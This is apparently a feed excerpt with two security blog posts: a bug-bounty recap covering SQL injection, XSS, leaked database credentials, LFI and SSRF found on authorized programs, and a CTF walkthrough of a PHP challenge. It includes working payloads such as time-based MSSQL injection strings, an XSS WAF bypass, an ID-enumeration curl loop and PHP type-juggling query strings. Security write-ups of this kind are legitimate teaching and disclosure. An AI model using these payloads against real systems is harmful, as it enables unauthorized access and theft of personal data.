I and @caffeinevulns took inspiration from @infosec_au&amp;rsquo;s blog about high-frequency bug hunting and how he found 120 bugs in 120 days. After going through the blog, we decided to try to find 120 bugs in 120 days. Although we did not exactly succeed in finding 120 bugs in 120 days, we still found pretty nice bugs. This blog will be a transparent disclosure of all the bugs I found on Synack Red Team during these 120 days and a small write-up about the techniques I used to find/exploit them.</description>
      <content>&lt;p&gt;Hi, guys!&lt;/p&gt;
&lt;p&gt;I and &lt;a href=&#34;https://twitter.com/caffeinevulns&#34;&gt;@caffeinevulns&lt;/a&gt; took inspiration from &lt;a href=&#34;https://twitter.com/infosec_au&#34;&gt;@infosec_au&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://shubs.io/high-frequency-security-bug-hunting-120-days-120-bugs/&#34;&gt;blog&lt;/a&gt; about high-frequency bug hunting and how he found 120 bugs in 120 days. After going through the blog, we decided to try to find 120 bugs in 120 days. Although we did not exactly succeed in finding 120 bugs in 120 days, we still found pretty nice bugs. This blog will be a transparent disclosure of all the bugs I found on Synack Red Team during these 120 days and a small write-up about the techniques I used to find/exploit them.&lt;/p&gt;
&lt;p&gt;This particular write-up is limited to my bugs only due to length concerns. However, you can find &lt;a href=&#34;https://twitter.com/caffeinevulns&#34;&gt;@caffeinevulns&lt;/a&gt;&amp;rsquo; bugs on his blog at &lt;a href=&#34;https://coffeejunkie.me/&#34;&gt;https://coffeejunkie.me/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For summarising, I found a total of 36 valid vulnerabilities and performed 29 missions and 29 patch verifications. Please note that I have not included duplicate and low-impact findings that were rejected. I originally decided to include them as well but then I felt lazy because I had to go through all the submissions once again and it was not worth the effort for rejected submissions.&lt;/p&gt;

&lt;p&gt;The PHP script &lt;strong&gt;/reports/posts.php&lt;/strong&gt; accepted a numeric POST parameter named &lt;code&gt;scheme&lt;/code&gt; which returned the residential address of users. I used the following command to enumerate different IDs and return addresses associated with the ID:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; id in &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;seq &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 50&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; curl https://&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;REDACTED&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;/reports/posts.php -X POST -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;scheme%5B%5D=&lt;/span&gt;$id&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;custom=&amp;amp;create=Posts&amp;#34;&lt;/span&gt; --silent | sed &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1,2d&amp;#39;&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above command will return addresses of users having IDs ranging from 1 to 50.&lt;/p&gt;
&lt;h4 id=&#34;misconfigured-web-server-leaks-admin-functionalities-in-302-response-body&#34;&gt;Misconfigured Web Server Leaks Admin Functionalities In 302 Response Body&lt;/h4&gt;
&lt;p&gt;This was the famous execute after redirect issue in PHP. The server had many PHP scripts that when visited, redirected to the login page. However, the 302 redirects also had the body contents of the same PHP script. Due to this, an attacker could access protected pages that leaked the admin functionality.&lt;/p&gt;
&lt;p&gt;I got around the redirect issue by adding the following match and replace rule in Burp:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Field&lt;/th&gt;
&lt;th&gt;Value&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Type&lt;/td&gt;
&lt;td&gt;Response header&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Match&lt;/td&gt;
&lt;td&gt;Location: https://[REDACTED].com&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Replace&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Comment&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Note: &lt;code&gt;Replace&lt;/code&gt; and &lt;code&gt;Comment&lt;/code&gt; fields are empty.&lt;/p&gt;
&lt;h4 id=&#34;multiple-time-based-sql-injections&#34;&gt;Multiple Time Based SQL Injections&lt;/h4&gt;
&lt;p&gt;This particular finding was very interesting because although it was pretty straightforward, &lt;code&gt;sqlmap&lt;/code&gt; was still not able to exploit it. For this vulnerability, I had to manually enumerate the database and dump information. It was a time-based SQL injection so it required a lot of patience to get something meaningful out of the database.&lt;/p&gt;
&lt;p&gt;I first confirmed the SQL injection using the same special character fuzzing. However, this time, the application did not throw an SQL error when we sent a single quote. Instead, the response content was changed. Normally, the page would respond with 400 bad request. But if you send a single quote in the parameter, the response code changed from 400 to 500 hinting at an SQL injection. Now, if we do &lt;code&gt;&#39;-- -&lt;/code&gt;, the WAF blocked us from using that payload. I tried to bypass the WAF by using different forms of comments like &lt;code&gt;#&lt;/code&gt; and &lt;code&gt;/*&lt;/code&gt; but none of them worked and the WAF still blocked us.&lt;/p&gt;
&lt;p&gt;The host where I confirmed SQLi was &lt;code&gt;api-gateway-c.[REDACTED].com&lt;/code&gt;. However, there was another host in scope which was very similar to our host. The other host was &lt;code&gt;api-gateway.[REDACTED].com&lt;/code&gt;. I checked if the auth token obtained from &lt;code&gt;api-gateway-c.[REDACTED].com&lt;/code&gt; worked on &lt;code&gt;api-gateway.[REDACTED].com&lt;/code&gt; and to my surprise, it actually did!&lt;/p&gt;
&lt;p&gt;I checked if the endpoints where I confirmed SQL injection was present on &lt;code&gt;api-gateway.[REDACTED].com&lt;/code&gt; or not. The endpoints were actually present! I sent the SQL injection payload &lt;code&gt;&#39;-- -&lt;/code&gt; to the new host and the server sent 400 again. This successfully confirmed that the new server was also vulnerable to SQL injection and was not protected with WAF. This allowed me to enumerate the database freely without any issues.&lt;/p&gt;
&lt;p&gt;The issues are still not resolved. For some reason, &lt;code&gt;sqlmap&lt;/code&gt; did not detect the injection point so I decided to manually enumerate the database.&lt;/p&gt;
&lt;p&gt;I could get the server to delay response using a payload like &lt;code&gt;&#39;; WAITFOR DELAY &#39;00:00:10&#39;-- -&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now, I needed to find a way to dump data using the delay. For that, I used MSSQL&amp;rsquo;s &lt;code&gt;IF&lt;/code&gt; statement. I constructed a payload that delayed the webserver for 10 seconds if the database username started with the character that I supplied. For example, the server would sleep for 10 seconds if the first letter of the database username was &amp;lsquo;A&amp;rsquo;.&lt;/p&gt;
&lt;p&gt;The payload that I constructed was as follows:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;IF&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; SYSEM_USER) &lt;span style=&#34;color:#66d9ef&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt;) WAITFOR DELAY &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;00:00:10&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I enumerated the whole database username this way. One character at a time. To enumerate one single character, it required me to send 64 requests. However, thanks to Burp Suite&amp;rsquo;s Intruder, I did not have to manually change the character and send 64 times. I just created a wordlist of lowercase and uppercase characters along with &lt;code&gt;-&lt;/code&gt; and &lt;code&gt;_&lt;/code&gt; as special characters and gave it to Intruder. Then, I sorted the results by the &lt;strong&gt;Response received&lt;/strong&gt; column.&lt;/p&gt;
&lt;p&gt;After running the Intruder 10 times, we get the 10 characters long database username.&lt;/p&gt;
&lt;p&gt;Normally, Synack Red Team requires actual table dumps to accept an SQL injection vulnerability. But in this case, they still accepted without me showing the database dumps because of the ridiculously slow data retrieval.&lt;/p&gt;
&lt;h4 id=&#34;reflected-xss-via-e-mail-parameter-with-aspnet-waf-bypass&#34;&gt;Reflected XSS via E-Mail parameter with ASP.NET WAF Bypass&lt;/h4&gt;
&lt;p&gt;I detect XSS vulnerabilities using a fairly simple payload like &lt;code&gt;d0mxss&#39;&amp;quot;&amp;gt;&amp;lt;&lt;/code&gt;. This payload allows me to find out the context in which the input is reflected. I used the same payload to detect this XSS. The payload was reflected in an input tag like:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;E-mail&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d0mxss&amp;#39;&amp;#34;&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt;&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The ASP.NET WAF blocked common payloads like &lt;code&gt;&amp;quot; onclick=&amp;quot;alert(1)&lt;/code&gt;. To bypass the WAF, I used the following payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34; onmouseenter=&amp;#34;alert(document.domain)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above payload will make the reflected HTML look like:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;E-mail&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onmouseenter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;alert(document.domain)&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When the user moves the pointer above the &lt;code&gt;E-mail&lt;/code&gt; input, the XSS gets triggered.&lt;/p&gt;
&lt;h4 id=&#34;login-authentication-bypass-in-client-side-ui&#34;&gt;Login Authentication Bypass In Client Side UI&lt;/h4&gt;
&lt;p&gt;This was a really lame vulnerability that should not exist at all. All the authentication mechanism was implemented in the frontend using JavaScript and no checking was done on the backend whatsoever. Even a simple login request was not sent to the backend.&lt;/p&gt;
&lt;p&gt;When we visited the web application, the application asked for a password in a JavaScript prompt. However, if we just click &amp;ldquo;&lt;strong&gt;cancel&lt;/strong&gt;&amp;rdquo; in the JavaScript prompt, we get access to the user interface.&lt;/p&gt;
&lt;p&gt;In fact, the UI had the functionality to execute SQL statements and all of this was possible by just clicking &amp;ldquo;&lt;strong&gt;cancel&lt;/strong&gt;&amp;rdquo;.&lt;/p&gt;
&lt;h4 id=&#34;access-control-issue-allows-to-execute-sql-statements&#34;&gt;Access Control Issue Allows To Execute SQL Statements&lt;/h4&gt;
&lt;p&gt;This was the same UI that we talked about in the previous vulnerability. I felt like a normal user should not be able to access the UI to execute SQL statements. This was because the interface was at the &lt;code&gt;/admin&lt;/code&gt; endpoint and this endpoint was discovered from JavaScript files and there were not any links/references to this endpoint in the UI.&lt;/p&gt;
&lt;p&gt;I found this concerning so I reported this issue and they actually accepted it considering it valid.&lt;/p&gt;
&lt;h4 id=&#34;connectors-endpoints-leaking-database-connection-information&#34;&gt;/connectors endpoints leaking Database Connection Information&lt;/h4&gt;
&lt;p&gt;When doing directory brute force with the &lt;code&gt;raft-small-words.txt&lt;/code&gt; wordlist provided in the &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;SecLists&lt;/a&gt;, I came across an endpoint called &lt;code&gt;/connectors&lt;/code&gt;. When visited, this endpoint listed the following connectors:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;jdbc_sink_auroradb&lt;/li&gt;
&lt;li&gt;local-file-sink&lt;/li&gt;
&lt;li&gt;mdb_sink_new&lt;/li&gt;
&lt;li&gt;s3_sink_sf_case_cdc1&lt;/li&gt;
&lt;li&gt;test-vk&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I then felt like these connectors should be accessible via URL. So, I visited the following URL: &lt;code&gt;http://[REDACTED]/connectors/jdbc_sink_auroradb&lt;/code&gt;. And the endpoint listed the PostgreSQL credentials. I checked for PostgreSQL instances on the network if there were any.&lt;/p&gt;
&lt;p&gt;To find PostgreSQL servers, I ran the following &lt;code&gt;masscan&lt;/code&gt; command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo masscan -iL scope.txt -p &lt;span style=&#34;color:#ae81ff&#34;&gt;5432&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the &lt;code&gt;masscan&lt;/code&gt; result, there were a couple of IPs. I used the credentials obtained from the &lt;code&gt;/connectors&lt;/code&gt; endpoint to log into these servers. And, the credentials actually worked!&lt;/p&gt;
&lt;p&gt;For logging in, I used the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;psql -h &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;REDACTED&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; -p &lt;span style=&#34;color:#ae81ff&#34;&gt;5432&lt;/span&gt; -U root postgres
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;local-file-inclusion-in-downloadphp&#34;&gt;Local File Inclusion In download.php&lt;/h4&gt;
&lt;p&gt;I found the &lt;code&gt;download.php&lt;/code&gt; file being reported as an SSRF in the analytics. However, it was rejected. I then investigated a bit more and found out that the &lt;code&gt;download.php&lt;/code&gt; takes a GET parameter named &lt;code&gt;f&lt;/code&gt; and the value of &lt;code&gt;f&lt;/code&gt; is a file that will be retrieved by the PHP script. Upon investigating the LFI, I found out that the script had the following line in the source code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;f&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, I just put &lt;code&gt;f=download.php&lt;/code&gt; to show the PoC.&lt;/p&gt;
&lt;h4 id=&#34;ssrf-allowing-to-access-internal-service&#34;&gt;SSRF Allowing To Access Internal Service&lt;/h4&gt;
&lt;p&gt;This was a vulnerability in Oracle Application Server 10g Mapviewer.&lt;/p&gt;
&lt;p&gt;For proof of concept, I performed a full port scan of the server to confirm that the &lt;code&gt;8002&lt;/code&gt; port was not exposed to the internet. I then put the URL &lt;code&gt;http://127.0.0.1:8002/mapviewer/omserver&lt;/code&gt; as the Mapviewer URL and submitted the request. The request succeeded and a response was received from the &lt;code&gt;8002&lt;/code&gt; port confirming the SSRF vulnerability.&lt;/p&gt;
&lt;p&gt;If we provided a port that was not open or did not serve HTTP, the response timed out.&lt;/p&gt;
&lt;h4 id=&#34;pre-auth-server-side-request-forgery&#34;&gt;Pre-auth Server Side Request Forgery&lt;/h4&gt;
&lt;p&gt;This was a &lt;code&gt;nuclei&lt;/code&gt; finding.&lt;/p&gt;
&lt;p&gt;This was however interesting because the same day, I was onboarded on two different programs from the same organization. One was an internal test meaning we had to test their internal network that is not reachable by the public. And the other was an external test that had public-facing IPs.&lt;/p&gt;
&lt;p&gt;One of such public-facing IPs was vulnerable to Microsoft Exchange&amp;rsquo;s CVE-2021-26855. This was a pre-auth SSRF and you can find the PoC on the internet.&lt;/p&gt;
&lt;p&gt;I could have reported this right away but I felt like I should fully exploit the impact of an SSRF. So, I took the list of IPs from the internal test and put them into the SSRF exploit to find out the HTTP servers.&lt;/p&gt;
&lt;p&gt;Synack&amp;rsquo;s VPN was not correctly configured and the internal IPs were not accessible by us. However, by exploiting this SSRF, I could reach those IPs as well.&lt;/p&gt;
&lt;p&gt;From this point, I did not go ahead to enumerate these IPs as post-exploitation is not allowed on Synack Red Team.&lt;/p&gt;
&lt;p&gt;Reported the issue and won the quality round.&lt;/p&gt;
&lt;p&gt;Thanks for the read. :)&lt;/p&gt;

      <description>Null community is an open security community where pen-testers, bug bounty hunters, students, security researchers come under the same roof and exchange knowledge. One of its chapter in Ahmedabad had CTF this 22nd. They made the CTF online and I was a volunteer of the community so it was obvious I was going to participate in it.
It had 6 challenges in total. Two web challenges, one binary exploitation, one steganography, one crypto, and one steganography + cryptography combined.</description>
      <content>&lt;p&gt;Null community is an open security community where pen-testers, bug bounty hunters, students, security researchers come under the same roof and exchange knowledge. One of its chapter in Ahmedabad had CTF this 22nd. They made the CTF online and I was a volunteer of the community so it was obvious I was going to participate in it.&lt;/p&gt;
&lt;p&gt;It had 6 challenges in total. Two web challenges, one binary exploitation, one steganography, one crypto, and one steganography + cryptography combined.&lt;/p&gt;
&lt;p&gt;This writeup is about a web challenge named &amp;ldquo;Prove yourself as 1337&amp;rdquo;. It was of 550 points, the highest of all challenges in the CTF. And looking at the difficulty it had, I think that even 550 points are less.&lt;/p&gt;
&lt;p&gt;Initially, there was an URL which leads to a web application. Below is the initial description of the challenge. It was sure that brute-forcing the parameters isn&amp;rsquo;t going to work as it was written: &amp;ldquo;don&amp;rsquo;t waste time&amp;rdquo;.  Also, it was said that: &amp;ldquo;A variable can lead to source code of index.php if set&amp;rdquo;. So, it gave us a hint that the variable might be boolean.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/challenge.png&#34; alt=&#34;Challenge&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now, as opening the URL gives, there was the following screen:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/webroot.png&#34; alt=&#34;webroot&#34;&gt;&lt;/p&gt;
&lt;p&gt;It took two inputs, one username, and password. I supplied 1337 and 1337 as username, password pair and I found a really interesting thing in the URL. So, two inputs were visible but it actually took 5 inputs out of which three were hidden.&lt;/p&gt;
&lt;p&gt;The URL was: &lt;a href=&#34;http://165.22.218.145/buggy/?username=1337&amp;amp;password=1337&amp;amp;random1=65616f96af8b27efd6c16f5249e58700&amp;amp;random2=7ec7e3cb456c9f07229df3fd1127ed42&amp;amp;source=0&#34;&gt;http://165.22.218.145/buggy/?username=1337&amp;amp;password=1337&amp;amp;random1=65616f96af8b27efd6c16f5249e58700&amp;amp;random2=7ec7e3cb456c9f07229df3fd1127ed42&amp;amp;source=0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Here, username and password were as it were. random1 and random2 were some random hash like values. And then there was a parameter named &amp;ldquo;source&amp;rdquo; and it was set to 0. I quickly figured out that this has something to do with the source code. I remembered the challenge description and it said, &amp;ldquo;A variable can lead to source code of index.php if set&amp;rdquo; so now I knew that I need to &amp;ldquo;set&amp;rdquo; this variable. I changed the value of it to 1 from 0 and it showed me the source code.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/source-code.png&#34; alt=&#34;Source Code&#34;&gt;&lt;/p&gt;
&lt;p&gt;I saw that there was a lot of md5 logic going on in the source code. I was wondering if this was a web challenge or a crypto challenge.&lt;/p&gt;
&lt;p&gt;The flags were coming from some other PHP script called as &amp;ldquo;flag.php&amp;rdquo;. I tried accessing it directly but no luck! There were three flags in total which; when concatenated, forms one final flag. Each of these individual flags had some conditions behind them. Which means the flag will be concatenated only if the condition falls true. There were three different conditions.&lt;/p&gt;
&lt;h3 id=&#34;condition-1&#34;&gt;Condition #1&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/condition-1.png&#34; alt=&#34;Condition 1&#34;&gt;&lt;/p&gt;
&lt;p&gt;In this, flag1 was concatenated to final_flag only if random1 and random2 variables were not identical but the hash of random1 variable concatenated with some secret variable called salt was identical to the hash of random2 variable concatenated with the salt. But one of the aims of hashes says that &amp;ldquo;Two different values must not produce the same hash&amp;rdquo;. So, looks like we are stuck here, or are we? However, here is an attack called hash collision attack which I quickly remembered in which two different values produce the exact same hash. I googled a lot to find such strings and I actually found them. But they were in binary format and we cannot pass it in the query string. I spent hours and hours searching for such strings but no luck.&lt;/p&gt;
&lt;p&gt;Then the other web challenge clicked in my head which was exploiting the type conversion of PHP(but not type juggling). Type conversion fails and gives a warning when supplying the incompatible type and did not throw and error. I checked in the PHP documentation of md5() and saw it takes a string as an input. Then I wondered what if I supply array as an input to the function like I did in the previous challenge. I changed &lt;code&gt;random1=65616f96af8b27efd6c16f5249e58700 and random2=7ec7e3cb456c9f07229df3fd1127ed42&lt;/code&gt; to &lt;code&gt;random1[]=65616f96af8b27efd6c16f5249e58700 and random2[]=7ec7e3cb456c9f07229df3fd1127ed42&lt;/code&gt; and the application threw the first part of the flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/flag-1.png&#34; alt=&#34;Flag 1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;condition-2&#34;&gt;Condition #2&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/condition-2.png&#34; alt=&#34;Condition 2&#34;&gt;&lt;/p&gt;
&lt;p&gt;Here, the first condition satisfies if both username and password are not empty. Then, username and password are concatenated and stored in a string called concat. Now, the second condition satisfies if the md5 hash of the concatenated string was equal to the string itself. But how is this even possible? We have learned that hash(string) ≠ string. But here, another PHP specific vulnerability lies here. And that was, yes as you have already guessed it, &amp;ldquo;Type Juggling&amp;rdquo;. Type juggling was introduced as a feature of PHP but turned out to be a critical authentication vulnerability. It means, type of variable is decided upon the context it is used in. Which means, if (&amp;ldquo;0e001234&amp;rdquo;==&amp;ldquo;0&amp;rdquo;) {} will return true even if they are not the exact same values.&lt;/p&gt;
&lt;p&gt;So, I needed to find such a value that it&amp;rsquo;s hash&amp;rsquo;s first one-digit are the same as the value&amp;rsquo;s first digit in order to make the condition true. It was a difficult process to do it all manually so I created a simple python script and ran it which eventually crashed my computer. I googled a lot to find such strings but could not find anything. I was out of luck. Then I decided to take a hint from the CTF platform which cost me 150 points but in turn returned me a &amp;ldquo;working&amp;rdquo; script which did not crash my computer. I ran it and in like 10 minutes, the number was there!!!&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username=0e2159&amp;amp;password=62017&amp;amp;random1[]=65616f96af8b27efd6c16f5249e58700&amp;amp;random2[]=7ec7e3cb456c9f07229df3fd1127ed42&amp;amp;source=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I put half of the number in username variable and the other half in password variable as they both were concatenated. And boom! Got the second part of the flag!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/flag-2.png&#34; alt=&#34;Flag 2&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;condition-3&#34;&gt;Condition #3&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/condition-3.png&#34; alt=&#34;Condition 3&#34;&gt;&lt;/p&gt;
&lt;p&gt;First of all, here is a call to the &lt;code&gt;parse_str()&lt;/code&gt; function which parses query string into an array called as res. I could not think of anything in this part of the challenge. I scratched my head for hours. Then I looked up for vulnerabilities in &lt;code&gt;parse_str()&lt;/code&gt; function as the last attempt. And it actually had a vulnerability. So, we can overwrite any already existing variable by passing it in a query string which was later parsed by &lt;code&gt;parse_str()&lt;/code&gt;. So, I supplied  the hash given in the source code as the value of the hashed variable using the query string:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username=0e2159&amp;amp;password=62017&amp;amp;random1[]=65616f96af8b27efd6c16f5249e58700&amp;amp;random2[]=7ec7e3cb456c9f07229df3fd1127ed42&amp;amp;source=1&amp;amp;hashed=ba6e12df1edab45f11f70b547dba9959
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And, finally, after hours of hard work, the flag was there!!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/flag-3.png&#34; alt=&#34;Flag 3&#34;&gt;&lt;/p&gt;
&lt;p&gt;It was a really fun challenge to solve. Kudos to everyone who made this CTF possible.&lt;/p&gt;
